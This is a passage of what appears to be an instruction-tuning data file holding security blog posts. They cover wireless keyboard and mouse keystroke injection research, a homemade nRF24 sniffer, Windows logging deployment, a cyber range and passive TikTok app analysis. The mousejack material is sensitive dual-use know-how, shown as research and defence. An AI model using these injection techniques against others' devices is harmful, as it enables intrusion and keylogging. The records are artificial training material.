frequency packets to a receiver dongle attached to a user's laptop or desktop computer When the user presses a key or moves clicks their mouse the action is transmitted to the dongle The dongle listens for radio frequency packets being sent by these paired devices and notifies the computer as the actions occur The dongle submits this information in the form of USB HID Human Interface Device packets To prevent eavesdropping many vendors encrypt their keyboard's transmitted traffic The dongle knows the encryption key being used by the keyboard and is able to decrypt the data to determine the action s being conveyed Without knowledge of this key an attacker would not have access to the plain text data or know the information being typed Marc Newlin Bastille Research discovered that none of the mice tested used any encryption techniques This means that the plain text data packets being transmitted by the mouse could be spoofed by an attacker pretending to be a mouse Marc Newlin also discovered that due to the way some dongles process their received packets it was actually possible to transmit specially created keystroke packets in place of mouse movements and mouse clicks In some cases he found that protocol weaknesses allowed an attacker to generate authentic-looking encrypted packets to the dongle In the course of Marc Newlin's research it was also determined that there were keyboards and mice that communicated with no encryption whatsoever This lack of an encryption protocol offers no security allowing an attacker to inject malicious keystrokes as well as sniff keystrokes being typed by the user Using the Crazyradio PA dongle it's possible to sniff the wireless keyboard and mouse traffic being sent to the dongle which is then converted to USB HID packets on the computer These HID packets can in turn be sniffed by enabling the usbmon kernel module on Linux thereby displaying the HID code of the key pressed The captured RF packets can then be analyzed against the HID packets generated to determine vendor-specific protocols Logitech Unifying Receivers Unifying is a proprietary protocol widely used by Logitech wireless mice and keyboards Logitech's main focus with the Unifying protocol was the ability to connect up to 6 compatible keyboards and mice to one computer with a single Unifying receiver and forget the hassle of multiple USB receivers The majority of Unifying dongles use Nordic nRF24L transceivers with the remaining devices using Texas Instruments CC254x transceivers All devices are compatible over-the-air regardless of the underlying hardware The Bastille Research Team determined that all Unifying packets use either a 5 10 or 22 byte ESB payload length In addition to the 2-byte CRC provided by the ESB packet Unifying packets are also secured with a 1-byte checksum Unifying keystroke packets are encrypted using 128-bit AES using a key generated during the pairing process The specific key algorithm was unknown to the team however they were able to demonstrate encrypted keystroke injection without knowledge of the key The dongles always operate in receive mode and all paired devices operate in transmit mode A dongle can not actively transmit to a paired device however it does use ACK payloads to send commands to a device Channel Hopping When a device is first switched on it transmits a wake-up packet to the address of the dongle that it's paired with This causes the dongle to begin listening on the address of the sending device In order to quickly respond to poor channel conditions a device sends periodic keep-alive packets to the dongle If a keep-alive packet is missed both the device and the dongle move to a new channel The periodic timing interval is set by the device Keeping the timeout interval shorter increases stability fewer channel changes but at the cost of high power consumption To better ensure reliable injections it's advisable to keep the timeout intervals shorter than the target device typically uses Pairing Host software enables pairing mode over USB Once enabled the dongle listens for new pairing devices on a fixed pairing address BB 0A DC A5 75 for a period of 30 60 seconds Not all firmware on Unifying dongles can be updated thus the need to keep the pairing process generic for backward compatibility When a device is first switched on it will attempt to reconnect to it's paired dongle using wake-up packets If it cannot find it's paired dongle it will transmit a pairing request to the fixed pairing address to initiate pairing Mousejack Device Discovery and Research Tools Bastille Research provides access to some of the tools they used for their research of exploitable devices ithub.com BastilleResearch mousejack In particular I found the nRF24_scanner.py and nRF24_sniffer.py python scripts extremely helpful while conducting my own research Other Contributors During my extensive research on this project I frequently found myself following the work of other researchers and their implementations of keystroke injection techniques In particular I want to give a shout-out to phikshun infamy JackIt Insecurity of Things In my previous blog Executing Keyboard Injection Attacks I reliably used JackIt to demonstrate my injection attacks to gain root access to vulnerable devices JackIt also proved to be an invaluable debugging tool while working on my promiscuous scanner sniffer project JackIt combines the tools of the Bastille Research Team with the already proven Ducky Scripting language of Darren Kitchen Hak5 into an awesome keystroke injection attack tool My keystroke injection research project would not be complete without also mentioning the recent work 2019 of Marcus Mengs Rogan Dawes Logitacker Marcus implemented a hardware solution to accomplish discovery passive and active enumeration forced pairing keystroke injection scripting and much more specifically for Logitech devices Using a Nordic nRF52840 pca 10059 USB dongle Marcus flashed his binary code to the dongle complete with a convenient command-line interface CLI Another major contributor to my keystroke exploitation research efforts is the work of Samy Kamkar author of KeySweeper Although I didn't actually attempt to construct his hardware project I did find the concept to be very interesting from a key-logging exfiltration point of view Samy's KeySweeper wirelessly sniffs decrypts and logs as well as reports using GSM on wireless Microsoft keyboards in the vicinity His write-up is very informative and quite easy to follow amy.pl keysweeper Building an inexpensive promiscuous sniffer Parts List Arduino Nano nRF24L01 Transceiver module Voltage regulator module Arduino Nano V3 module nRF24L01 PA LNA long-range module optional Wiring the hardware is pretty straightforward The nRF24 radio is controlled via SPI serial peripheral interface and the SPI pins are clearly marked on the voltage regulator board Initially I breadboarded the project and later fabricated a stand-alone direct-wired version Either method can be built rather quickly depending on your soldering and or breadboard experience Also I decided to maintain a color-code scheme throughout my hardware design work Doing so helps reduce if not eliminate the potential for wiring errors The Arduino Nano V3 is a breadboard friendly micro-controller board based on the ATmega328 It has 22 input output pins 14 digital and 8 analog 32Kb flash memory 2Kb flash bootloader and 8Kb of SRAM The Arduino sniffer sketch will need to be programmed into the Arduino Nano board using the Arduino IDE ww.arduino.cc en Main Software IMPORTANT NOTE You can use the nRF24L01 transceiver without using the voltage regulator however if you choose to do so you must power the nRF24L01 with 3.3v maximum or risk destroying the module If you use the voltage regulator board highly recommended you can power it with 5v and the regulator board will safely regulate it down the 3.3v for the radio Both 3.3v and 5v outputs are available on the Nano board Keep in mind transmitting requires quite a bit of power PA max setting and at times the Arduino Nano may have trouble delivering the required power This can cause intermittent dropped packets as well as limit the effective range Using the voltage regulator board significantly improves the overall performance of the radio The effective range with the voltage regulator board is approximately 100 meters 10 meters without Using the optional nRF24L01 PA LNA long-range module with external antenna has been tested and verified to reach 1100 meters line of sight Wiring Diagram Due to my past success using JackIt for keystroke injections and my desire for a compact device capable of being attached to a mobile phone I decided to work from Insecurity of Things uC_mousejack phikshun repository The uC_mousejack project consisted of getting 'mousejack attacks into a small embedded device with the form factor of a key chain The code provides a tool to use Duckyscript to launch automated keystroke injection attacks against Microsoft and Logitech devices If you have no idea what Duckyscript is see the Hak5 USB Rubber Ducky Wiki ithub.com hak5darren USB-Rubber-Ducky wiki Promiscuous Sniffer Code git clone ithub.com insecurityofthings uC_mousejack cd uC_mousejack src mkdir promisc_sniffer copy c attack.h promisc_sniffer copy c promisc_sniffer.ino promisc_sniffer cd promisc_sniffer run promisc_sniffer.ino Primarily I was interested in being able to promiscuously scan passive-enumeration mac addresses of potentially vulnerable devices in the vicinity and then sniff those addresses active-enumeration to determine packet payloads and thereby fingerprint the device as exploitable Microsoft or Logitech devices where applicable For this particular project I was not concerned with the attack mode feature of uC_mousejack and intentionally disabled this function in the code If you decide that you want to re-enable attack mode please know that no interaction is required to initiate an attack Be careful where you use this device We can not accept any responsibility for how this tool is used Also note that I modified the code to monitor the keystroke injection being transmitted and display these packets via the serial bus This data can be viewed using the Serial Monitor under Tools in the Arduino IDE or by monitoring the serial port if using platformIO Alternatively you can view this data in Windows-based systems with PuTTY Sample Output of a Vulnerable Microsoft Mouse 5000 passive active enumeration determined by a valid payload length checksum verified and fingerprinted HID Type Sample of Keystroke Injection Attack on Vulnerable Logitech K400r Keyboard injection 'ABC Sample of Keystroke Injection Attack on Vulnerable Microsoft Mouse 5000 injection 'ABC Obviously this is where the fun really begins Deciphering these proprietary packets needs to be done on a vendor by vendor basis to determine the exact protocols being used by these devices to communicate with the dongle 'Stay-Alive and 'wake-up packets need to be recognized and fingerprinted as well as inter-packet timing intervals need to be established and maintained Marc Newlin Bastille Research and Thorsten Schr\u00f6der Max Moser have done an enormous amount of research in this area and their whitepapers are open-source and publicly available Conclusion As you might have noticed there have only been a handful of industry-leading security researchers investigating this area of wireless exploitation And although they have been extremely successful at varying degrees we can all agree it's next to impossible to check every keyboard and mouse out there in the wild Obviously some of these devices can be updated with new firmware thereby mitigating the risk provided they take the initiative to do so however there are many devices out there with OTP one time programmable firmware exposing complete systems and ultimately complete networks to malicious attacks The quickest and most obvious solution would be to swap out wireless keyboards and mice with their wired counterparts in secured areas Bluetooth devices tend to be a bit more expensive and prone to use considerably more power however these too would help reduce the risk of exposure From an InfoSec perspective taking the promiscuous sniffer approach and maintaining a database of known vulnerable devices and their fingerprints could go a long way in helping corporations learn of possible weaknesses in their infrastructure Ideally it would be beneficial to be able to go onsite fire up a portable sniffer capture addresses and packets fingerprint these devices as vulnerable or safe and ultimately print out a log of suspect devices for the customer Just a thought In closing I will say that I have learned an enormous amount of information about this often overlooked area of wireless exploitation As more and more security concerns arise in the IoT internet of things it is sometimes very easy to overlook keyboards and mice as simplistic and harmless devices Up until a couple of months ago I surely did Going forward that will change References Goodspeed Travis February 7 2011 Promiscuity is the nRF24L01 's Duty Retrieved from ravisgoodspeed.blogspot.com 2011 02 promiscuity-is-nrf24l01s-dut Newlin Marc October 24 2015 Hacking Wireless Mice with an NES Controller Presented at ToorCon 17 San Diego CA Bitcraze AB 2016 Crazyflie 2.0 Retrieved from ww.bitcraze.io crazyflie-2 Bitcraze AB 2016 Crazyradio PA Retrieved from ww.bitcraze.io crazyradio-pa Related Work KeyKeriki v2.0 2.4GHz Thorsten Schr\u00f6der Max Moser CanSecWest 2010 ww.remote-exploit.org articles keykeriki_v2_0__8211_2_4ghz eb.nvd.nist.gov view vuln detail?vulnId CVE-2010-1184 Promiscuity is the nRF24L01 's Duty Travis Goodspeed 2011 ravisgoodspeed.blogspot.com 2011 02 promiscuity-is-nrf24l01s-duty.html KeySweeper Samy Kamkar 2015 amy.pl keysweeper"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>How To Deploy Windows Optics: Commands, Downloads, Instructions, and Screenshots</title>\n<taxonomies>Author, How-To, Informational, Jordan Drysdale, Kent Ickler, Jordan Drysdale, Kent Ickler, Windows Optics</taxonomies>\n<creation_date>Wed, 17 Jun 2020 18:16:45 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale Kent Ickler TL DR Look for links download them Look for GPOs import them Look for screenshots for guidance Sysmon Windows Audit Policies Event Collectors and Forwarding Handlers WinLogBeat Elastic The baseline configuration for producing endpoint optics that matter for almost free PART 1 Building Your Lab Environment There are some significant pre-recommendations for a complete follow along Be warned this environment will not run on your laptop Be prepared to consume 6 CPUs 20GB of RAM and about 120GB of disk space It would be best to deploy a PFSense router on your virtual environment and build an isolated network behind it PFSense VM 1 vCPU 4GB RAM 20GB disk WAN DHCP LAN 10.10.98.1 24 Instructions for deploying on VMWare ocs.netgate.com pfsense en latest virtualization virtualizing-pfsense-with-vmware-vsphere-esxi.html .iso Download ww.pfsense.org download Windows Server 2016 Domain Controller 1 vCPU 2 is better 4GB RAM more is better 32GB disk 10.10.98.10 24 DNS 127.0.0.1 DNS2 1.1.1.1 Deploy a domain scripts on Github ithub.com DefensiveOrigins DomainBuildScripts Skip ADDS-Step4 and run BadBlood for the love of everything don't do this on your business domain Windows 10 Domained Workstation 1 vCPU 2 is better 4GB RAM more is better 32GB disk DHCP Domain joined Ubuntu 18.04 Elastic Stack and Attack Rig 2 vCPUs 8GB RAM 32GB disk 10.10.98.20 24 DNS 10.10.98.10 DNS2 1.1.1.1 Install HELK Use the initial user account to git clone NOT ROOT user git clone ithub.com Cyb3rWarD0g HELK.git user sudo -s root cd HELK docker root helk_install.sh will take about 15 minutes Your lab should look approximately like this at this point Part 2 Sysmon Download the Modular Repo Download the Sysmon modular repo ithub.com olafhartong sysmon-modular This repository once downloaded appears as follows The power of this configuration utility is the include exclude configuration available under each of the associated Sysmon event ID containers For example event ID 3's container 3_network_connection_initiated has the following file structure The includes and excludes define the rules which Sysmon utilizes to write events Read the repo's notes You probably want to exclude some things Too much noise is not a good thing Or just download sysmonconfig.xml from ithub.com olafhartong sysmon-modular blob master sysmonconfig.xml and know that Olaf is looking out for us all Generate A Config File Generate your own sysmon config from the sysmon-modular directory Open a PowerShell window and CD in to the just downloaded and extracted repository repo Once you are comfortable with the container structure and the underlying processes make the changes appropriate for your network Then perform the following command to generate your own configuration file Install Commands The following commands instantiate a PowerShell session that does not care about your Code Signing practices accepts that change request pulls in the code and merges your Sysmon modular directory structure's contents Set-ExecutionPolicy bypass Y import-module Merge-SysmonXml.ps1 Merge-AllSysmonXml -Path Get-ChildItem 0-9 .xml -AsString Out-File sysmonconfig.xml Note this sysmonconfig.xml file will be used during installation of Sysmon Manual Sysmon Install The configuration file generated earlier sysmonconfig.xml should be used for the install Download Sysmon because we can't provide it for you ocs.microsoft.com en-us sysinternals downloads sysmon sysmon64.exe -accepteula -i sysmonconfig.xml Repeat this process for all lab systems Any time you make changes to the sysmon-modular container regenerate the configuration file using the merge-all script You can easily update the Sysmon configuration then with the following command run it against your new config file Only run the next command when you have updated the original sysmonconfig.xml sysmon.exe -c sysmonconfig.xml Group Policy Deployment The SysPanda article here details the process ww.syspanda.com index.php 2017 02 28 deploying-sysmon-through-gpo Create a startup script that calls the sysmon-gpo.bat file which is included in the APT-Class repos Link the GPO wherever it belongs for installs Part 3 Windows Audit Policies The following section includes a lot of reading because the audit policies we configured in the provided GPOs may not match your desired end state Knowledge Expansion Guidance for the Windows Audit Policy configuration baselines derived from ocs.microsoft.com en-us windows-server identity ad-ds plan security-best-practices audit-policy-recommendations And Palantir also provides a fair amount of guidance for setting up the GPOs ithub.com palantir windows-event-forwarding tree master group-policy-objects Deploying GPOs Create two GPOs in the Group Policy Management console and some time will be saved by importing the settings from provided GPOs Enhanced-WS-Auditing Enhanced-DC-Auditing Import settings from ithub.com DefensiveOrigins APT06202001 tree master Lab-GPOs or follow the Microsoft or Palantir guidance as described to build out your own audit policies Browse to your copy of the GPO backup Complete the same process for the DC-Auditing policy Linking GPOs to OUs This write-up is light on background and long on technical So for a quick refresh a group policy object or GPO contains a set of instructions for Windows objects Linking GPOs to objects is also dependent on the structure of your organizational units OUs If you have a messy OU structure this step might be a challenge to get right However in our lab environment you may need to create a couple of OUs for workstations or ComputerObjects Laptops and ComputerObjects Workstations so that the instruction sets can be applied appropriately Link the Enhanced-WS-Auditing GPO to the AD OU containing the Windows 10 installation Link the Enhanced-DC-Auditing GPO to the AD OU called Domain Controllers When complete the simplest deployment appears as follows Part 4 WEF WEC Event Channel Configuration This is the part where we configure event forwarding instructions and fire up an event collector The collector needs buckets for inbound logs and event subscriptions for the Windows Event Forwarding WEF clients Windows Event Forwarding Open gpmc.msc group policy management console on the Event Collector Create a new GPO called Windows Event Forwarding Gather the objects from the following repo for import Depending on your lab's domain naming you may need to modify the server FQDN The WEF GPO is located in the ithub.com DefensiveOrigins APT06202001 tree master Lab-GPOs repo We need to make sure Event Log Readers built-in local group can do its thing Configure or just double check the subscription manager URL which is the event collector Configuration Check This policy configuration parameter is located in the GPO tree here Computer Configuration Policies Administrative Templates Windows Components Windows Event Forwarding Configure target Subscription Manager The subscription manager should be ourWEC'sFQDN 5985 wsman SubscriptionManager WEC Refresh 60 There seems to be a spot of confusion around using HTTP for this connection My understanding is that the forwarded logs are still encrypted via Kerberos in transit Enable WinRM Required on All Systems Since all systems in the collection and forwarding process need WinRM create and attach a GPO for this service and the firewall rule Create a new GPO called Enable WinRM and Firewall Rule Navigate to Computer Policies Windows Components Windows Remote Management WinRM WinRM Service Set Allow remote server management to enabled Next Computer Preferences Control Panel Services and add WinRM as shown below Next create the firewall rule which is located in the GPO tree below or we've already done this and exported the GPO for your use Computer Configuration Policies Security Settings Windows Firewall and Advanced Security Windows Firewall and Advanced Security Add a Pre-Defined rule for WinRM Or create a new GPO called Enable WinRM and Firewall Rule and import the settings from the provided GPO by the same name Link GPOs Attach this GPO to the domain At this point the following configuration is the simplest deployment possible to enable baseline audit policies enable WinRM and tell systems where the Subscription Manager for forwarding events is located on the network All Systems Enable WinRM and Firewall Rule Workstations Audit Policy and Windows Event Forwarding Domain Controllers Audit Policy and Windows Event Forwarding Windows Event Collector Event Channel Configuration on the Event Collector Download and extract the Palantir Event Forwarding Repo ithub.com palantir windows-event-forwarding Access the Event Collector DC in lab enviro and from the CMD prompt stop the wecsvc net stop Wecsvc Disable all WEF subscriptions manually in event viewer by unloading the current Event Channels um unload manifest wevtutil um C windows system32 CustomEventChannels.man Replace the files listed below in C Windows System32 from the repo's windows-event-channels container Or if they don't exist just copy them over there CustomEventChannels.dll CustomEventChannels.man Load the replacement channels im import manifest wevtutil im C windows system32 CustomEventChannels.man Increase the size of the channels log buckets in PowerShell now Not CMD CMD C powershell -ep bypass xml wevtutil el select-string -pattern WEC foreach subscription in xml wevtutil sl subscription ms 4194304 Restart the Event Collector service from CMD prompt net start wecsvc Event Viewer should have some new channels on the collector You may need to restart the Windows Event Viewer service Next add the associated subscriptions CD into the wef-subscriptions container in the windows-event-forwarding directory Install all subscriptions with the following for loop CMD prompt not PowerShell for r i in .xml do wecutil cs i With all of the appropriate GPOs linked like so Enable WinRM All systems DC-Auditing DC only WS-Auditing All workstations Windows-Event-Forwarding All systems Run the following on both domain systems gpupdate force Part 5 Finally Log Shipping with WinLogBeats Download the Repo Because We Cannot Provide it for You Download the WinLogBeat config file winlogbeat.yml from Defensive Origins Github ithub.com DefensiveOrigins APT06202001 tree master Lab-WinLogBeat This config file as was pointed out to us by a most gracious member of the community that our Elastic instance utilizes Kafka for ingests You may need to modify the last couple lines in the file to match up your network configuration We have further altered the terms of the config file to include all WEC entries and event channel configuration Download the WinLogBeat installer ww.elastic.co downloads beats winlogbeat Replace the provided winlogbeat.yml file with the provided instance you may need to check the IP address directive for the Logstash configuration at the very bottom of the file Install the Shipper Open a PowerShell session in the WinLogBeat directory and run the following commands powershell -Exec bypass -File install-service-winlogbeat.ps1 Set-Service -Name winlogbeat -StartupType automatic Start-Service -Name winlogbeat Get-Service winlogbeat Beats is running Check your Kibana install for logs Done Thank you for getting this far We appreciate all the support from the community including banjocrashland strandjs cyb3rward0g olafhartong Cheers And happy hunting Jordan and Kent Black Hills InfoSec Defensive Origins"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>We Have Built a Cyber Range!</title>\n<taxonomies>Author, Fun & Games, General InfoSec Tips & Tricks, Informational, InfoSec 101, John Strand, cyber range, john strand</taxonomies>\n<creation_date>Mon, 20 Jul 2020 18:41:42 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "John Strand Hello all I wanted to take a few moments and share what we have been up to in conjunction with MetaCTF We have built a cyber range ww.blackhillsinfosec.com services cyber-range Yes I know very well that this is not interesting However there are a couple of things that are pretty neat about it First it is free with every single WWHF training purchase Please see a full list of our online training here ildwesthackinfest.com deadwood training We really hate it when training has labs that are awesome but just while you are in class We also think there is a need to constantly be upgrading your skills And this is a great way to do it Further it gives you something to do when you hit PowerPoint burnout Also we are constantly adding new challenges to the range Here is our latest batch ww.blackhillsinfosec.com services cyber-range cyber-range-updates Finally we are constantly adding new videos to the BHIS YouTube channel This is even cooler with the range because we are tying videos back to the range So if you get stuck and need a hint many of the challenges will tie back to a video explaining the concept in even more detail Here are some examples ww.youtube.com watch?v l2hN3Tluzi0 t 13s ww.youtube.com watch?v TzG_iflIiig t 10s ww.youtube.com watch?v Xb52oX1wsn0 t 8s ww.youtube.com watch?v eETUi-AZYgc t 3s ww.youtube.com watch?v hC3ANnUXn_o t 69s"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Let's Talk About TikTok</title>\n<taxonomies>Author, Derek Banks, Fun & Games, How-To, Informational, Derek Banks, TikTok</taxonomies>\n<creation_date>Thu, 23 Jul 2020 14:03:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Derek Banks I recently heard something on the news that caught my attention I suppose that isn't abnormal these days but this in particular was the first time I had heard of anything like it The US Government was considering banning a popular application in use on mobile devices Not just on government devices but for all Americans That app was TikTok Now I am old enough where I only kind of know what TikTok is something about sharing video clips over social media or something apparently my kids like it something something get off my lawn The alleged reason given for banning such an app was that it was sending data on US citizens to the Chinese government The only thing close to this that I recall bubbling up to national news was a ban on Huawei devices for the same kind of fears Data privacy concerns and surveillance capitalism tactics are fascinating and complex topics that I think really deserve more attention I think that at this point in time most infosec professionals would answer Yes to the question Do your apps and devices spy on you But to what extent The intention of this blog is not to answer that question that would probably take an entire book but rather to cover a few core skills on how one could get started on the journey of mobile device and Android application analysis and answer that question for themselves We will be sticking to passive kinds of analysis For example we will attempt to identify network traffic and API calls but we will not be sending manipulated data to the API servers We can look at the application and data on the device but should be really careful manipulating the application as it may do something unintended upstream There is a time and place for that kind of testing and generally involves authorization to test the application in some form a pen test or bug bounty program for example As luck would have it I own a rooted Google 6P which is a Huawei manufactured Android phone I use it as a lab phone running Android 6.0 and Kali NetHunter and I use it mostly for Android application tests I thought it would be interesting to take a look at what the network traffic looks like from the device And then afterward install TikTok and see what the communication looks like from it Device Baseline Analysis To start I wanted to see what remote hosts the phone attempted to connect to prior to installing TikTok I configured a Raspberry Pi 4 device that was part of a dropbox project that I did with Beau Bullock and Ralph May as an access point so that I could perform a packet capture of the device traffic To get the WiFi access point running I used a slightly modified version of the instructions David Fletcher published on our blog in 2017 Once the wireless access point was functional I associated the phone to the network then shut it off I then started tcpdump listening to the br0 interface and writing the packet capture out to file Next I booted up the phone and let it sit idle for an hour while the pcap ran Note that there was not a SIM card in the phone so it would not have an alternative but to use the WiFi access point Note that there were no other devices associated with the access point There are many options to analyze pcaps Wireshark is by far the most popular and I use it quite a bit I also like to use command-line tools a fair amount too as in my opinion they are easier to generate data that can be further processed One of the techniques I like to start with when analyzing any network traffic is long and short tail analysis In other words I like to see which hosts were communicated to the most and which ones the least This can be valuable at scale to find outliers in the data Tshark the command line equivalent of Wireshark can be used to generate this type of analysis First we can look to see what DNS lookups were performed the most and the least by the device In our case there were only 51 unique hosts but there were still some interesting results As expected there were a lot of requests for Google hosts It was after all a Google device and Operating system It should be obvious to all tech folks in 2020 that Google constantly tracks your location and behavior but that is a different topic for a different time For this goal I wanted to find something unexpected So let's run the same tshark command but exclude google and gstatic as a term That gets the list of hosts down to 23 Looking at the output I think we could safely remove ytimg.com YouTube and ntp.org from the suspicious list Note that when I say suspicious list at this point of an analysis I mean it warrants more investigation not that I think it is malicious Malicious needs to be proven in my opinion As someone who has used cloudfront.net for relaying malware communications in the past the 48 lookups to d2to8y50b3n6dq.cloudfront.net stuck out to me as something I would want to investigate as an analyst same with akamaized.net I don't consider it a good idea to assume all Content Delivery Network CDN traffic to be benign Attackers want to hide in the noise and CDNs are a great place for that Using whois the app-measurement.com domain appeared to be related to Google so we can shelve that one for analysis purposes Also I had Instagram on the phone so we can ignore the related domains there too Though it is somewhat interesting that after a reboot the device without the Instagram app being opened there are communication attempts to the related hosts likely the APIs The xtrapath3.izatcloud.net domain appeared to be related to the Android operating system and the GPS configuration So we're on to these weird-looking DNS lookups qiqgyezmfcqf.example.org oxxlgxxwtp.example.org jmnqdgx.example.org jmnqdgx qiqgyezmfcqf oxxlgxxwtp They sure do look like they would be related to something malicious right Well turns out Chrome does this for a pretty good reason Some ISPs will respond to unresolved DNS requests with a page they control Often these contain Ads Often ad servers spread malware and at the very least users probably don't want to see the ads Chrome will notice if these requests resolve the same A record and if so block any corresponding ads This would be expected behavior on an Android phone The lightstep-collector.api.ua.com and identity.api.ua.com domains appeared to be related to Under Armor based on the whois information This can be explained since MapMyRun was installed on the device The insightapi.p3-group.com seemed harder to explain The whois information was protected by domain privacy Visiting the p3-group.com website they appeared to be a tech consulting company but the site was in WordPress and while it looked nice it's really not hard to stand up fake content in a WordPress site Not that I am saying it's not legitimate only that I couldn't reasonably explain the traffic at this point of the analysis and thought it needed further looking into We will put that in the suspicious bin The cdn.ampproject.com domain appeared to be related to Google and accelerating searches on mobile devices That left the two reverse DNS lookups to 89.62.225.13 and 160.62.225.13 One seemed to be related to a telecom in Germany and a pharmaceutical company hosted at a german ISP I've seen before where whois was not accurate and an IP address was reassigned but we will put that in the suspicious bin since it's not easily explained So from all the DNS hosts the list of hosts that need more investigation were D2to8y50b3n6dq.cloudfront.net p3ins.akamized.net 89.62.225.13.in-addr.arpa 160.62.225.13.in-addr.arpa For further investigation we move to Wireshark and Burp Suite Opening the pcap up in Wireshark we can use filters to find the two lookups we are interested in dns.qry.name 160.62.225.13.in-addr.arpa It appeared that both PTR records pointed to server-13-225-62-89.ewr53.r.cloudfront.net There was no other traffic to the IP addresses or the server-13-225-62-89.ewr53.r.cloudfront.net and addresses I still think that the reverse lookups were strange but without additional traffic it's difficult to say that malicious communication is happening The next step would be to attempt to find a reference to the IP addresses on the file system of the device to see what they may be associated with But we should run down the rest of the network traffic first Since we have the pcap open in Wireshark let's take a look at the protocol hierarchy and see if there are other protocols besides HTTP and TLS we should investigate This can be found under the Statistics menu It's expected that the vast majority of the traffic from the phone will be HTTP and TLS though I have seen in the past where other protocols were in use In this case HTTP TLS and ICMP appeared to be the only protocols we would want to investigate Aside from pinging the local network gateway all of the ICMP traffic appeared to be ICMP Destination Port unreachable so not likely any kind of ICMP tunnel or other covert communications over ICMP At this point we should start looking at HTTP S traffic The best way to do this in my opinion would be to set up Burp Suite Professional as an intercepting proxy I suggest spending the money on the professional for any level of application testing as it is too valuable of a tool for the cost However the community version should also be fine for just analyzing the requests and responses which is mostly what we will be using it for Once Burp Suite has launched you will want to configure the proxy to listen on a network that the mobile device is also on because the default is the localhost address where Burp is running Likely this is just the same WiFi network This is found under the Options tab under the Proxy tab Configure a web browser I recommend Firefox for web and application testing on the system running Burp and configure it to use the proxy A handy tool for switching between the proxy settings and no proxy in Firefox is the FoxyProxy Standard extension Once the browser is configured visit urp and click CA Certificate to download the CA cert Once downloaded while you're here import the certificate into Firefox's certificate store This is found under Preferences and Privacy and Security Click View Certificates then Import and follow the prompts and select Use this certificate to identify websites Getting the mobile device proxied through Burp Suite can be a little bit trickier depending on the version of Android in use There is a reason that I use Android 6.0 for testing whenever possible Starting with Android 7.0 the OS no longer honors the user certificate store to identify websites So using Android 6.0 for testing purposes is usually a bit easier To install the Burp Suite Certificate for Android 6.0 Configure browser to use Burp and visit urp Download cacert.der rename to cacert.crt Adb push cacert.crt mnt sdcard Download On device Settings Security Install from Storage select cacert.crt If you are using Android 7.0 and higher you will need to install the certificate as a system-level cert The instructions here should help get you started From the phone to set the proxy up go to advanced options of the connected WiFi network then select manual for proxy settings then enter the IP address and port that was configured in Burp Suite Once my phone was communicating through Burp I rebooted it to see if the same traffic from the pcap would show up in Burp The D2to8y50b3n6dq.cloudfront.net domain appeared to be used to download a certificate store There were two files downloaded cdnconfig.zip and truststore.zip The contents of the zip files correspond to what the URL stated that purpose was to download certificate store contents This seemed to explain the D2to8y50b3n6dq.cloudfront.net and p3ins.akamized.net traffic Though I am not entirely sure how this is being used on the device when it is downloaded it did not appear to be malicious However I did not verify each CA in the truststore file If this was a corporate device that effort may be worthwhile At this point I felt pretty comfortable that at least for the hour the packet capture was running that there was no data being siphoned from the phone without my knowledge or some other kind of compromise or malware Does this mean that I am 100 sure that something doesn't check in to a command and control server once a day or once a month Not at all but I am fairly confident that the device isn't actively compromised App Analysis Now on to TikTok Before installing it from the Google Play Store I used ADB to list the installed packages on the phone adb shell 'pm list packages f I started doing this on app assessments because sometimes the app isn't named something obvious Then I installed TikTok from the Play Store and tried to find it with ADB Sure enough it was not named anything related to TikTok I created two text lists and used Python to find the difference between them The name of the app was com.zhiliaoapp.musically Note that after the fact I realized I totally forgot about the command line utility diff I have had Python on the brain for the last few months and when you have a hammer everything looks like a nail Next I used ADB to locate the base APK and pull it from the device for static analysis using the following steps adb shell pm path com.zhiliaoapp.musically adb pull data app com.zhiliaoapp.musically-1 base.apk path to desired destination Once the APK file was copied off I processed it in MobSF to get an overview of the app with automated static analysis I like starting mobile application assessments with MobSF because it automates some tasks that I would otherwise need to perform manually The application appeared to be relatively complex with 16 exported activities 22 exported services 22 exported receivers and 4 providers An activity is a user interaction sort of like an application on a Windows OS where the user interacts with the application A service is a background task to perform some kind of operation Broadcast receivers send and receive messages to other Android apps or the Android OS Content providers manage data by the app and help share data with other apps All of these were essentially the attack surface area of the application and could be manipulated in some unintended way The best way to do that in my opinion is to use the Drozer framework It turned out that TikTok was a relatively large application most of the Android apps I have analyzed in penetration tests have about a quarter of this size of attack surface area Analyzing these in detail will have to be a later blog post because of the number of them and that they may not help us answer our original question what if any personal data is being sent from the application MobSF can provide some interesting information along these lines as it extracts permission information from the Android manifest It can be difficult to ascertain if apps are overly permissive and if there are permissions granted that shouldn't be necessary but as with the size of exported intents there were a lot of declared permissions There were 67 declared permissions In comparison to other apps I have analyzed this was a relatively large amount PERMISSIONDESCRIPTIONandroid.permission.INTERNETAllows an application to create network sockets.android.permission.ACCESS_NETWORK_STATEAllows an application to view the status of all networks.android.permission.READ_EXTERNAL_STORAGEAllows an application to read from SD 